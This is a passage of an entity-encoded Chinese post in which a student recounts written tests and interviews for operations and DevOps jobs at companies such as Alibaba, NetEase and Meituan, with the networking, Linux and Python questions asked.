5EE;&#x9898;&#x5DEE;&#x4E0D;&#x591A;&#x90FD;&#x4E00;&#x6837;&#x3002;</p><p>RAID &#x7684;&#x5404;&#x4E2A;&#x7EA7;&#x522B;&#x53CA;&#x533A;&#x522B;<br>python &#x4E2D; list &#x548C; tuple &#x7684;&#x533A;&#x522B; list &#x662F;&#x53EF;&#x53D8;&#x7684;&#xFF0C;tuple &#x662F;&#x4E0D;&#x53EF;&#x53D8;&#x7684;&#xFF0C;&#x53EF;&#x53D8;&#x4E0E;&#x53EF;&#x53D8;&#x8BF4;&#x7684;&#x662F;&#x5185;&#x5B58;&#x5730;&#x5740;&#x662F;&#x5426;&#x53EF;&#x53D8;&#x3002;<br>tcp &#x7684;&#x6162;&#x542F;&#x52A8; &#x4E3A;&#x4E86;&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x63A7;&#x5236;&#xFF0C;TCP &#x5728;&#x53D1;&#x9001;&#x65B9;&#x7EF4;&#x62A4;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x201D;&#x63A5;&#x6536;&#x7A97;&#x53E3;&#x201D;,&#x53D1;&#x9001;&#x7AEF;&#x7684;&#x53D1;&#x9001;&#x7A97;&#x53E3;&#x4E0A;&#x9650;&#x503C;&#x5E94;&#x53D6;&#x201C;&#x63A5;&#x6536;&#x65B9;&#x7A97;&#x53E3;&#x201D;&#x548C;&#x201C;&#x62E5;&#x585E;&#x7A97;&#x53E3;&#x201D;&#x4E2D;&#x8F83;&#x5C0F;&#x7684;&#x4E00;&#x4E2A;&#xFF0C;&#x524D;&#x8005;&#x662F;&#x6765;&#x81EA;&#x63A5;&#x6536;&#x65B9;&#x7684;&#x6D41;&#x91CF;&#x63A7;&#x5236;&#xFF0C;&#x540E;&#x8005;&#x662F;&#x6765;&#x81EA;&#x53D1;&#x9001;&#x65B9;&#x7684;&#x6D41;&#x91CF;&#x63A7;&#x5236;&#x3002;&#x4E3A;&#x4E86;&#x66F4;&#x597D;&#x7684;&#x5728;&#x8FD0;&#x8F93;&#x5C42;&#x8FDB;&#x884C;&#x62E5;&#x585E;&#x63A7;&#x5236;&#xFF0C;&#x56E0;&#x7279;&#x7F51;&#x5B9A;&#x4E49;&#x4E86; 4 &#x79CD;&#x7B97;&#x6CD5;&#xFF0C;&#x5373;&#x6162;&#x542F;&#x52A8;&#xFF0C;&#x62E5;&#x585E;&#x907F;&#x514D;&#xFF0C;&#x5FEB;&#x91CD;&#x4F20;&#xFF0C;&#x5FEB;&#x6062;&#x590D;&#x3002; &#x6162;&#x542F;&#x52A8;&#x9636;&#x6BB5;&#xFF0C;&#x62E5;&#x585E;&#x7A97;&#x53E3;&#x4ECE; 0 &#x5F00;&#x59CB;&#x4EE5;&#x6307;&#x6570;&#x65B9;&#x5F0F;&#x5FEB;&#x901F;&#x589E;&#x52A0;&#xFF0C;&#x76F4;&#x5230;&#x8FBE;&#x5230;&#x62E5;&#x585E;&#x7A97;&#x53E3;&#x7684;&#x95E8;&#x9650;&#x503C;&#xFF0C;&#x7136;&#x540E;&#x5F00;&#x59CB;&#x6267;&#x884C;&#x62E5;&#x585E;&#x907F;&#x514D;&#xFF0C;&#x5373;&#x62E5;&#x585E;&#x7A97;&#x53E3;&#x4EE5;&#x7EBF;&#x6027;&#x901F;&#x5EA6;&#x589E;&#x52A0;&#x3002;<br>tcp &#x72B6;&#x6001; time_wait &#x7684;&#x4F5C;&#x7528; TIME_WAIT &#x662F;&#x4E3A;&#x4E86;&#x5B9E;&#x73B0; TCP &#x5168;&#x53CC;&#x5DE5;&#x8FDE;&#x63A5;&#x7684;&#x53EF;&#x9760;&#x6027;&#x5173;&#x95ED;&#xFF0C;&#x7528;&#x6765;&#x91CD;&#x53D1;&#x53EF;&#x80FD;&#x4E22;&#x5931;&#x7684; ACK &#x62A5;&#x6587;&#xFF1B;&#x9700;&#x8981;&#x6301;&#x7EED;2&#x4E2A;MSL(&#x6700;&#x5927;&#x62A5;&#x6587;&#x751F;&#x5B58;&#x65F6;&#x95F4;)&#xFF1A;&#x5047;&#x8BBE;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7AEF;&#x53E3;&#x5728;&#x8FDB;&#x5165;TIME_WAIT&#x540E;&#xFF0C;2&#x4E2A; MSL&#x65F6;&#x95F4;&#x5185;&#x5E76;&#x6CA1;&#x6709;&#x6536;&#x5230;FIN,&#x8BF4;&#x660E;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6700;&#x540E;&#x53D1;&#x51FA;&#x7684;ACK&#x5DF2;&#x7ECF;&#x6536;&#x5230;&#x4E86;&#xFF1B;&#x5426;&#x5219;&#xFF0C;&#x4F1A;&#x5728;2&#x4E2A;MSL&#x5185;&#x518D;&#x6B21;&#x6536;&#x5230;ACK.<br>&#x56DE;&#x9000;N&#x5E27;&#x534F;&#x8BAE;/&#x6ED1;&#x52A8;&#x7A97;&#x53E3;<br>python&#x7684;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF0C;&#x6211;&#x535A;&#x5BA2;&#x505A;&#x4E86;&#x5F88;&#x8BE6;&#x7EC6;&#x7684;&#x89E3;&#x91CA;&#xFF0C;&#x6211;&#x7684;&#x535A;&#x5BA2;<br>&#x963F;&#x91CC;<br>&#x5B9E;&#x4E60;&#x65F6;&#x81EA;&#x5DF1;&#x5185;&#x63A8;&#x4E86;&#x7CFB;&#x7EDF;&#x5DE5;&#x7A0B;&#x5E08;&#xFF0C;&#x672C;&#x6765;&#x662F;&#x7B80;&#x5386;&#x90FD;&#x6CA1;&#x8FC7;&#xFF0C;&#x5927;&#x795E;&#x534E;&#x54E5;&#x5E2E;&#x6211;&#x590D;&#x6D3B;&#xFF0C;&#x9762;&#x4E86;7&#x9762;&#xFF0C;&#x6211;&#x90FD;&#x4E0D;&#x77E5;&#x9053;&#x9762;&#x4E86;&#x4E9B;&#x4EC0;&#x4E48;&#x3002;</p><p>&#x79CB;&#x62DB;<br>&#x5386;&#x7A0B;<br>&#x963F;&#x91CC;&#x5185;&#x63A8;&#x6302;</p><p>&#x963F;&#x91CC;&#x6821;&#x62DB;java&#x5F00;&#x53D1;</p><p>&#x7F51;&#x6613;&#x5185;&#x63A8; &#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08; &#xFF08;&#x4E00;&#x9762;-&gt;&#x4E8C;&#x9762;-&gt;&#x603B;&#x76D1;&#x9762;-&gt;hr&#x6302;&#xFF09;</p><p>&#x817E;&#x8BAF;&#xFF08;&#x5185;&#x63A8;&#x6CA1;&#x7406;&#x6211;&#xFF0C;&#x6821;&#x62DB;&#x4E00;&#x9762;&#x6302;&#xFF09;</p><p>&#x7F8E;&#x56E2;&#xFF08;&#x4E00;&#x9762;-&gt;&#x4E8C;&#x9762;-&gt;&#x4E09;&#x9762;-&gt;hr&#x6302;&#xFF09;</p><p>&#x767E;&#x5EA6;&#xFF08;&#x56E0;&#x4E3A;&#x7F8E;&#x56E2;&#x9762;&#x8BD5;&#x803D;&#x8BEF;&#x592A;&#x591A;&#x65F6;&#x95F4;&#xFF0C;&#x9519;&#x8FC7;&#x4E86;&#x9762;&#x8BD5;&#xFF0C;&#x4F46;&#x6700;&#x540E;&#x53C8;&#x53BB;&#x9762;&#x8BD5;&#xFF0C;&#x9762;&#x8BD5;&#x5B98;&#x7ED9;&#x4E86;&#x4E2A;&#x673A;&#x4F1A;&#xFF0C;&#x4E09;&#x9762;&#x6302; &#xFF09;</p><p>&#x641C;&#x72D7;&#xFF08;&#x7F8E;&#x56E2;&#x9762;&#x8BD5;&#x4E2D;&#xFF0C;&#x6CA1;&#x6709;&#x53BB;&#x9762;&#x8BD5;&#xFF0C;&#x5F88;&#x9057;&#x61BE;&#xFF09;</p><p>&#x5FAE;&#x5E97;&#x63D0;&#x524D;&#x6279; &#x8FD0;&#x7EF4;&#x7814;&#x53D1;</p><p>&#x8611;&#x83C7;&#x8857; &#xFF08;&#x7B80;&#x5386;&#x7B5B;&#x9009;&#x672A;&#x8FC7;&#xFF09;</p><p>&#x7F51;&#x6613;&#x6E38;&#x620F;&#x4E92;&#x52A8;&#x5A31;&#x4E50;&#xFF08;&#x7B2C;&#x4E00;&#x6B21;&#x9762;&#x8BD5;&#x6B62;&#x6B65;&#x4E8C;&#x9762;&#xFF09;</p><p>&#x65B0;&#x6D6A;&#x793E;&#x62DB;/&#x65B0;&#x6D6A;&#x5FAE;&#x535A;</p><p>&#x7F51;&#x6613;&#x5317;&#x4EAC; &#x8FD0;&#x7EF4;&#x7814;&#x53D1;&#xFF08;offer&#xFF0C;&#x5F52;&#x5C5E;&#xFF09;</p><p>&#x8FD8;&#x6709;&#x5176;&#x5B83;&#x7684;4399&#xFF0C;&#x5B8C;&#x7F8E;&#x4E16;&#x754C;&#x4E4B;&#x7C7B;</p><p>&#x7B14;&#x8BD5;<br>&#x7B14;&#x8BD5;&#x7F51;&#x7AD9;&#x76EE;&#x524D;&#x5C31;&#x51E0;&#x5BB6;&#x5427;:&#x725B;&#x5BA2;&#x7F51;,&#x8D5B;&#x7801;&#x7F51;,ceping,amact,&#x524D;&#x9762;2&#x4E2A;&#x7F51;&#x7AD9;&#x7F16;&#x7A0B;&#x9898;&#x53EF;&#x4EE5;&#x8DF3;&#x51FA;,&#x540E;&#x9762;&#x51E0;&#x4E2A;&#x90FD;&#x4E0D;&#x80FD;.</p><p>&#x767E;&#x5EA6;:&#x4E00;&#x822C;&#x7528;&#x7684;&#x662F;&#x8D5B;&#x7801;&#x7F51;&#x548C;amact&#xFF0C;&#x7F16;&#x7A0B;&#x9898;&#x90FD;&#x4E0D;&#x80FD;&#x8DF3;&#x51FA;</p><p>&#x963F;&#x91CC;&#x5DF4;&#x5DF4;:&#x7528;&#x7684;&#x662F;&#x81EA;&#x5DF1;&#x7814;&#x53D1;&#x7684;&#x7B14;&#x8BD5;&#x7F51;&#x7AD9;,&#x4E00;&#x822C;&#x662F;20&#x4E2A;&#x9009;&#x62E9;&#x9898;(&#x6570;&#x5B66;&#x9898;&#x548C;&#x667A;&#x529B;&#x9898;&#x5C45;&#x591A;),3&#x9053;&#x9644;&#x52A0;&#x9898;(&#x5F88;&#x96BE;)&#xFF0C;&#x53CD;&#x6B63;&#x5C31;&#x662F;&#x5199;&#x4E00;&#x5927;&#x5806;&#x3002;</p><p>&#x817E;&#x8BAF;:&#x4E00;&#x76F4;&#x90FD;&#x7528;&#x7684;&#x662F;ceping&#x7F51;,30&#x9053;&#x9009;&#x62E9;&#x9898;,&#x7136;&#x540E;&#x51E0;&#x9053;&#x8BBA;&#x8FF0;&#x9898;,&#x4E00;&#x822C;&#x90FD;&#x662F;&#x67B6;&#x6784;.</p><p>&#x7F51;&#x6613;&#xFF1A;&#x725B;&#x5BA2;&#x7F51;&#xFF0C;&#x5185;&#x63A8;&#x65F6;&#x51FA;&#x4E86;&#x5C0F;&#x95EE;&#x9898;&#xFF0C;&#x4E0D;&#x8FC7;&#x8FD8;&#x597D;&#xFF0C;&#x4F9D;&#x7136;&#x8FC7;&#x4E86;&#x7B14;&#x8BD5;&#xFF0C;&#x6821;&#x62DB;&#x9009;&#x62E9;&#x4E86;&#x7F51;&#x6613;&#x653E;&#x5F03;&#x4E86;&#x5C0F;&#x7C73;&#x3002;</p><p>&#x7F51;&#x6613;&#x6E38;&#x620F;&#xFF1A;&#x4E92;&#x52A8;&#x5A31;&#x4E50;&#x51FA;&#x7684;&#x6700;&#x6B63;&#x5B97;&#x7684;&#x8FD0;&#x7EF4;&#x7B14;&#x8BD5;&#x9898;&#xFF0C;&#x5F88;&#x7ED9;&#x529B;&#xFF0C;&#x9898;&#x91CF;&#x5927;&#x3002;</p><p>&#x5FAE;&#x8F6F;&#x4E2D;&#x56FD;&#xFF1A;&#x8FD8;&#x662F;&#x5F88;&#x96BE;&#xFF0C;&#x540C;&#x6837;&#x7F16;&#x7A0B;&#x3002;</p><p>&#x534E;&#x4E3A;:&#x673A;&#x8BD5;&#x597D;&#x50CF;&#x662F;3&#x9053;&#x7F16;&#x7A0B;&#x9898;.</p><p>google&#xFF0C;google&#x662F;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x6D4B;&#x8BC4;&#xFF0C;&#x9898;&#x8FD8;&#x662F;&#x5F88;&#x96BE;&#x3002;&#x9762;&#x8BD5;&#x82F1;&#x6587;&#xFF0C;&#x538B;&#x529B;&#x5927;&#x3002;</p><p>&#x5176;&#x4F59;&#x7684;&#x516C;&#x53F8;:&#x7EBF;&#x4E0A;&#x6216;&#x8005;&#x7EBF;&#x4E0B;&#x7B14;&#x8BD5;&#xFF08;&#x7B14;&#x8BD5;&#x9898;&#x4E2D;C/C &#x504F;&#x591A;&#xFF09;</p><p>&#x9762;&#x8BD5;<br>&#x8BF4;&#x51E0;&#x4E2A;&#x81EA;&#x5DF1;&#x89C9;&#x5F97;&#x91CD;&#x8981;&#x7684;&#x5427;</p><p>&#x963F;&#x91CC;<br>&#x5185;&#x63A8;</p><p>&#x963F;&#x91CC;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x770B;&#x91CD;&#x57FA;&#x7840;&#x7684;&#x516C;&#x53F8;&#xFF0C;&#x8981;&#x6C42;&#x5F88;&#x591A;&#xFF0C;&#x9762;&#x8BD5;&#x5B98;&#x5F88;nice&#xFF0C;&#x4E5F;&#x662F;&#x81EA;&#x5DF1;&#x4ECE;&#x5927;&#x4E8C;&#x5F00;&#x59CB;&#x5C31;&#x53BB;&#x9762;&#x8BD5;&#x7684;&#x4E00;&#x5BB6;&#x516C;&#x53F8;&#xFF0C;&#x4E4B;&#x524D;&#x5B9E;&#x4E60;&#x4E5F;&#x53BB;&#x9762;&#x8FC7;&#xFF0C;&#x6821;&#x62DB;&#x9762;&#x7684;cdn&#x90E8;&#x95E8;&#xFF0C;&#x5404;&#x79CD;&#x7F51;&#x7EDC;&#x95EE;&#x9898;&#xFF0C;&#x4EE5;&#x53CA;&#x6709;&#x5173;cdn&#x7684;&#x95EE;&#x9898;&#x3002;</p><p>&#x4E00;&#x9762;&#x662F;&#x5728;&#x81EA;&#x5DF1;&#x53C2;&#x52A0;&#x5B8C;&#x7F51;&#x6613;&#x5317;&#x4EAC;&#x5185;&#x63A8;&#x9762;&#x8BD5;&#x56DE;&#x5317;&#x4EAC;&#x7684;&#x8DEF;&#x4E0A;&#xFF0C;&#x81EA;&#x5DF1;&#x627E;&#x4E86;&#x4E2A;&#x89D2;&#x843D;&#xFF0C;&#x9762;&#x4E86;20&#x5206;&#x949F;&#xFF0C;&#x7136;&#x540E;&#x8BF4;&#x4E8C;&#x9762;&#x4F1A;&#x6709;&#x540E;&#x7EED;&#x901A;&#x77E5;&#xFF0C;&#x6CA1;&#x6709;&#x7136;&#x540E;&#x4E86;&#x3002;</p><p>&#x6821;&#x62DB;</p><p>&#x4E00;&#x9762;&#xFF1A; &#x9762;&#x8BD5;&#x5B98;&#x5F88;&#x4E25;&#x5389;&#xFF0C;&#x5168;&#x7A0B;&#x4E0D;&#x600E;&#x4E48;&#x8BF4;&#x8BDD;&#xFF0C;&#x6211;&#x5C31;&#x4E00;&#x76F4;&#x5199;&#x4EE3;&#x7801;&#x3002;&#x4ECE;&#x6700;&#x7B80;&#x5355;&#x7684;&#x94FE;&#x8868;&#x9006;&#x7F6E;&#x5230;&#x4E8C;&#x53C9;&#x6811;&#xFF0C;&#x5B57;&#x7B26;&#x4E32;&#x5339;&#x914D;&#x7B97;&#x6CD5;&#x3002;&#x8FD8;&#x6709;&#x5C31;&#x662F;&#x95EE;&#x4E86;python&#xFF0C;java&#x7684;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF0C;&#x65B0;&#x751F;&#x4EE3;&#x4EC0;&#x4E48;&#xFF0C;&#x753B;&#x56FE;&#x7ED9;&#x9762;&#x8BD5;&#x5B98;&#x770B;&#x4E86;&#xFF0C;jvm&#x7684;&#x4E00;&#x4E9B;&#xFF08;&#x63D0;&#x524D;&#x770B;&#x4E86;&#x9762;&#x7ECF;&#xFF0C;&#x8868;&#x73B0;&#x7684;&#x4F1A;&#x597D;&#x4E00;&#x70B9;&#xFF09;&#x3002;&#x5230;&#x4E86;&#x6700;&#x540E;&#xFF0C;&#x9762;&#x8BD5;&#x5B98;&#x624D;&#x8868;&#x73B0;&#x7B11;&#x5BB9;&#xFF0C;&#x8BA9;&#x6211;&#x7B49;&#x540E;&#x7EED;&#x901A;&#x77E5;&#x3002;</p><p>&#x4E8C;&#x9762;&#xFF1A; &#x4E8C;&#x9762;&#x9762;&#x8BD5;&#x5B98;&#x5F88;&#x548C;&#x853C;&#xFF0C;&#x95EE;&#x4E86;&#x4E0B;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x9879;&#x76EE;&#xFF0C;&#x57FA;&#x4E8E;python&#x7684;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#xFF0C;&#x95EE;&#x4E86;&#x4E0B;hadoop&#x7684;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#xFF0C;HDFS&#xFF0C;mapreduce&#x7684;&#x4E00;&#x4E9B;&#x3002;&#x4F5C;&#x4E1A;&#x63D0;&#x4EA4;&#xFF08;&#x57FA;&#x4E8E;java API&#xFF0C;streaming&#xFF0C;pipes&#xFF09;&#xFF0C;&#x753B;&#x4E86;&#x4E0B;hadoop&#x7684;&#x67B6;&#x6784;&#xFF0C;&#x6700;&#x540E;&#x8868;&#x793A;&#x81EA;&#x5DF1;&#x5BF9;&#x8FD0;&#x7EF4;&#x6BD4;&#x8F83;&#x719F;&#x6089;&#xFF0C;&#x5BF9;&#x5F00;&#x53D1;&#x8FD9;&#x5757;&#x6BD4;&#x8F83;&#x5F31;&#x3002;&#x7136;&#x540E;&#x9762;&#x8BD5;&#x5B98;&#x95EE;&#x4E86;&#x4E0B;linux&#x76F8;&#x5173;&#x7684;&#x95EE;&#x9898;&#x3002;</p><p>&#x4E09;&#x9762;&#xFF1A;&#x95EE;&#x4E86;&#x9879;&#x76EE;&#x76F8;&#x5173;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4EE5;&#x53CA;linux&#xFF0C;&#x8FD8;&#x6709;c/c &#x7684;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x8FD8;&#x6709;&#x5C31;&#x662F;&#x7B97;&#x6CD5;&#xFF0C;&#x9762;&#x8BD5;&#x5B98;&#x7B11;&#x95EE;&#x6211;&#xFF0C;&#x4E0D;&#x662F;&#x64C5;&#x957F;python&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x5199;&#x7B97;&#x6CD5;&#x9898;&#x7528;c,&#x5F53;&#x65F6;&#x56DE;&#x7B54;&#x4E86;&#x81EA;&#x5DF1;&#x611F;&#x89C9;&#x597D;&#x628A;&#x63E1;&#xFF0C;&#x597D;&#x8868;&#x793A;&#x3002;</p><p>hr&#x9762;&#xFF1A;&#x67E5;&#x6237;&#x53E3;</p><p>&#x8FC7;&#x4E86;&#x4E24;&#x5468;&#x7ED9;&#x4E86;&#x53E3;&#x5934;offer&#xFF0C;&#x6CA1;&#x6709;&#x7136;&#x540E;&#x4E86;&#x3002;</p><p>&#x7F51;&#x6613;<br>&#x5185;&#x63A8;</p><p>&#x7F51;&#x6613;&#x5185;&#x63A8;&#x4EBA;&#x597D;&#x5C11;&#xFF0C;&#x53BB;&#x5317;&#x4EAC;&#x9762;&#x8BD5;&#x7684;&#x53EA;&#x6709;&#x51E0;&#x4E2A;&#xFF0C;&#x5F53;&#x65F6;&#x53BB;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x9047;&#x5230;&#x4E00;&#x4E2A;&#x7279;&#x522B;&#x597D;&#x7684;hr&#x3002;&#x7136;&#x540E;&#x7ED9;&#x6211;&#x5B89;&#x6392;&#x9762;&#x8BD5;&#x3002;</p><p>&#x4E00;&#x9762;&#xFF1A; python&#x591A;&#x7EBF;&#x7A0B;&#xFF08;threading/thread&#xFF09;&#xFF0C;lvs&#x56DB;&#x79CD;&#x5DE5;&#x4F5C;&#x6A21;&#x5F0F;&#xFF0C;&#x7136;&#x540E;&#x5404;&#x79CD;&#x95EE;&#xFF0C;nat&#x6A21;&#x5F0F;&#x600E;&#x4E48;&#x5B9E;&#x73B0;&#xFF0C;dr&#x6A21;&#x5F0F;&#x600E;&#x4E48;&#x7981;&#x6B62;arp&#xFF0C;&#x7981;&#x7528;arp&#x540E;&#xFF0C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x5668;&#x600E;&#x4E48;&#x627E;&#x5230;&#x540E;&#x7AEF;&#x771F;&#x5B9E;&#x670D;&#x52A1;&#x5668;mac&#xFF0C;&#x5982;&#x679C;&#x4E2D;&#x95F4;&#x6709;&#x8DEF;&#x7531;&#xFF0C;&#x6709;&#x4EA4;&#x6362;&#x673A;&#xFF0C;&#x600E;&#x4E48;&#x627E;&#xFF08;&#x771F;&#x5B9E;&#x670D;&#x52A1;&#x5668;&#x7981;&#x7528;&#x7684;&#x662F;lo&#x7684;arp&#x54CD;&#x5E94;&#xFF0C;vip&#x4E5F;&#x662F;&#x7ED1;&#x5B9A;&#x5728;lo&#x4E0A;&#xFF0C;&#x4F46;&#x6709;&#x771F;&#x5B9E;&#x670D;&#x52A1;&#x5668;&#x7684;ip&#xFF09;; python&#x8C03;&#x7528;shell&#x547D;&#x4EE4;,&#x4E4B;&#x95F4;&#x65B9;&#x6CD5;&#x6709;&#x4EC0;&#x4E48;&#x4E0D;&#x540C;&#xFF0C;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x8FD4;&#x56DE;&#x503C;&#x3002;ssh&#x7684;&#x539F;&#x7406;&#x3002;&#x5BF9;&#x865A;&#x62DF;&#x5316;&#x7684;&#x4E86;&#x89E3;&#xFF0C;kvm/xen&#x3002;iptables&#x89C4;&#x5219;&#x7684;&#x4E66;&#x5199;&#xFF1B;&#x81EA;&#x5DF1;&#x7684;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0;&#x9879;&#x76EE;&#x7684;&#x76F8;&#x5173;&#x95EE;&#x9898;&#xFF0C;&#x7EDF;&#x8BA1;nginx&#x65E5;&#x5FD7;&#x51FA;&#x73B0;&#x6B21;&#x6570;&#x6700;&#x591A;&#x7684;ip&#xFF0C;awk&#x641E;&#x5B9A;&#xFF0C;&#x6700;&#x540E;&#x53C8;&#x4F5C;&#x6B7B;&#x8BF4;&#x4E86;hadoop&#x7684;nginx&#x65E5;&#x5FD7;&#x5206;&#x6790;&#xFF0C;&#x9762;&#x8BD5;&#x5B98;&#x8BA9;&#x6211;&#x4ECB;&#x7ECD;&#x4E0B;hadoop&#xFF0C;&#x5DEE;&#x70B9;&#x6302;&#x4E86;&#x3002;</p><p>&#x4E8C;&#x9762;&#xFF1A; &#x5199;&#x4E8C;&#x5206;&#x67E5;&#x627E;&#xFF0C;&#x5FEB;&#x901F;&#x6392;&#x5E8F;&#xFF0C;&#x7ED9;&#x9762;&#x8BD5;&#x5B98;&#x8BB2;&#x5E38;&#x89C1;&#x7684;&#x6392;&#x5E8F;&#x601D;&#x60F3;&#xFF0C;&#x753B;&#x56FE;&#xFF1B;python&#x7684;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF0C;&#x548C;C/C &#x6709;&#x4EC0;&#x4E48;&#x4E0D;&#x540C;&#xFF0C;python&#x6709;&#x56DE;&#x6536;&#x673A;&#x5236;&#xFF0C;C/C &#x624B;&#x52A8;&#x56DE;&#x6536;&#xFF08;malloc/free new/delete&#xFF09;&#x3002;&#x95EE;&#x7528;&#x8FC7;&#x4EC0;&#x4E48;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x5DE5;&#x5177;&#xFF0C;puppet/ansible/saltstack&#x2026;;&#x53C8;&#x95EE;&#x6709;&#x4EC0;&#x4E48;&#x533A;&#x522B;&#xFF0C;&#x7B54;&#x7684;&#x5F88;&#x5DEE;&#xFF0C;&#x5C31;&#x662F;&#x7B54;&#x4E86;c/s&#x67B6;&#x6784;&#xFF0C;ssh&#x548C;&#x6D88;&#x606F;&#x961F;&#x5217;&#x3002;&#x7B49;&#x4FAF;&#x4E09;&#x9762;&#x3002;</p><p>&#x4E2D;&#x95F4;hr&#x7ED9;&#x4E86;&#x4E2A;&#x996D;&#x7968;&#xFF0C;&#x53BB;&#x7F51;&#x6613;&#x5403;&#x4E86;&#x4E2A;&#x996D;&#x3002;</p><p>&#x4E09;&#x9762;&#xFF1A;&#x4EE5;&#x4E3A;&#x4E09;&#x9762;&#x5C31;&#x662F;hr&#x9762;&#xFF0C;&#x7ED3;&#x679C;&#x52A0;&#x4E86;&#x4E00;&#x9762;&#x3002;&#x7EE7;&#x7EED;&#x6280;&#x672F;&#x9762;&#xFF0C;&#x95EE;&#x4E86;docker&#xFF0C;openstack&#xFF0C;&#x65E5;&#x5FD7;&#x5904;&#x7406;ELK&#x7684;&#x539F;&#x7406;&#x673A;&#x5236;&#x3002;&#x4E4B;&#x540E;&#x5C31;&#x662F;&#x95EE;&#x5BB6;&#x5EAD;&#x60C5;&#x51B5;&#xFF0C;&#x613F;&#x4E0D;&#x613F;&#x610F;&#x6765;&#x5317;&#x4EAC;&#xFF0C;&#x5E73;&#x65F6;&#x559C;&#x6B22;&#x770B;&#x4EC0;&#x4E48;&#x4E66;&#x3002;</p><p>hr&#x9762;&#xFF1A; &#x5BB6;&#x5EAD;&#x60C5;&#x51B5;&#xFF0C;&#x5DE5;&#x4F5C;&#x5730;&#x70B9;&#x8981;&#x6C42;&#xFF0C;&#x60F3;&#x6210;&#x4E3A;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x4EBA;&#xFF0C;&#x5B66;&#x4E60;&#x8BA1;&#x5212;&#xFF0C;&#x85AA;&#x8D44;&#x8981;&#x6C42;&#xFF08;&#x8981;&#x4E86;8000&#xFF09;</p><p>&#x4E4B;&#x540E;&#x7B49;&#x901A;&#x77E5;&#xFF0C;G20&#x8FC7;&#x540E;&#xFF0C;&#x7B49;&#x6765;&#x62D2;&#x4FE1;&#x3002;</p><p>&#x6821;&#x62DB;</p><p>&#x6821;&#x62DB;&#x65F6;&#x81EA;&#x5DF1;&#x6295;&#x4E86;&#x8FD0;&#x7EF4;&#x7814;&#x53D1;&#x5C97;&#xFF0C;&#x653E;&#x5F03;&#x5C0F;&#x7C73;&#x7B14;&#x8BD5;&#xFF0C;&#x641E;&#x4E86;&#x7F51;&#x6613;&#x5317;&#x4EAC;&#x7684;&#x8FD0;&#x7EF4;&#x7814;&#x53D1;&#x7B14;&#x8BD5;&#x9898;&#x3002;&#x4E4B;&#x540E;&#x901A;&#x77E5;&#x53BB;&#x9762;&#x8BD5;&#xFF0C;&#x4F46;&#x7F51;&#x6613;&#x6E38;&#x620F;&#x7684;&#x673A;&#x7968;&#x4E5F;&#x5728;&#x90A3;&#x4E00;&#x5929;&#xFF0C;&#x5C31;&#x548C;hr&#x6C9F;&#x901A;&#x8FC7;&#x540E;&#xFF0C;&#x7B2C;&#x4E8C;&#x5929;&#x53BB;&#x9762;&#x8BD5;&#x3002;&#x65E9;&#x4E0A;&#x9762;&#x5B8C;&#x7F51;&#x6613;&#x6E38;&#x620F;&#xFF0C;&#x4E2D;&#x5348;&#x8D76;&#x7D27;&#x53BB;&#x7F51;&#x6613;&#x9762;&#x8BD5;&#x3002;&#x8D76;&#x5230;&#x7F51;&#x6613;&#x65F6;&#xFF0C;2&#x70B9;&#xFF0C;&#x7B7E;&#x5230;&#x4E4B;&#x540E;&#x7B49;&#x5F85;&#xFF0C;&#x7B49;&#x5230;&#x4E0B;&#x5348;&#x5FEB;5&#x70B9;&#x65F6;&#xFF0C;&#x7EC8;&#x4E8E;&#x53EF;&#x4EE5;&#x8BA9;&#x6211;&#x9762;&#x8BD5;&#x4E86;&#x3002;</p><p>&#x4E00;&#x9762;&#xFF1A; &#x9762;&#x8BD5;&#x5B98;&#x662F;&#x6211;&#x4E8C;&#x9762;&#x9762;&#x8BD5;&#x5B98;&#xFF0C;&#x6CA1;&#x6709;&#x81EA;&#x6211;&#x4ECB;&#x7ECD;&#xFF0C;&#x95EE;linux&#x547D;&#x4EE4;&#xFF0C;&#x95EE;&#x7F51;&#x7EDC;&#xFF1B;&#x56DE;&#x7B54;nginx&#x7684;&#x60CA;&#x7FA4;&#x95EE;&#x9898;&#xFF0C;&#xFF08;&#x591A;&#x7EBF;&#x7A0B;/&#x591A;&#x8FDB;&#x7A0B;&#xFF08;Linux&#x4E0B;&#x7EBF;&#x7A0B;&#x8FDB;&#x7A0B;&#x4E5F;&#x6CA1;&#x591A;&#x5927;&#x533A;&#x522B;&#xFF09;&#x7B49;&#x5F85;&#x540C;&#x4E00;&#x4E2A;socket&#x4E8B;&#x4EF6;&#xFF0C;&#x5F53;&#x8FD9;&#x4E2A;&#x4E8B;&#x4EF6;&#x53D1;&#x751F;&#x65F6;&#xFF0C;&#x8FD9;&#x4E9B;&#x7EBF;&#x7A0B;/&#x8FDB;&#x7A0B;&#x88AB;&#x540C;&#x65F6;&#x5524;&#x9192;&#xFF0C;&#x5C31;&#x662F;&#x60CA;&#x7FA4;&#x3002;&#x8BB8;&#x591A;&#x8FDB;&#x7A0B;&#x88AB;&#x5185;&#x6838;&#x91CD;&#x65B0;&#x8C03;&#x5EA6;&#x5524;&#x9192;&#xFF0C;&#x540C;&#x65F6;&#x53BB;&#x54CD;&#x5E94;&#x8FD9;&#x4E00;&#x4E2A;&#x4E8B;&#x4EF6;&#xFF0C;&#x5F53;&#x7136;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x80FD;&#x5904;&#x7406;&#x4E8B;&#x4EF6;&#x6210;&#x529F;